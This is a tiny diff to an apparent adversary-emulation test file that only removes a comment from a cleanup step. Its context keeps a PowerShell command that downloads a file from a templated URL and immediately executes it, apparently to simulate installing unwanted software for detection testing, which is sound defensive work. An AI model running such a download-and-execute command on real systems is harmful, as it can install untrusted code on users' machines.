@@ -312,6 +312,6 @@ atomic_tests:
     command: |
       Invoke-WebRequest #{pua_url} -OutFile #{pua_file}
       & "#{pua_file}"
-    cleanup_command: | # You can remove the cleanup_command section if there are no cleanup commands.
+    cleanup_command: |
       Remove-Item #{pua_file}
 
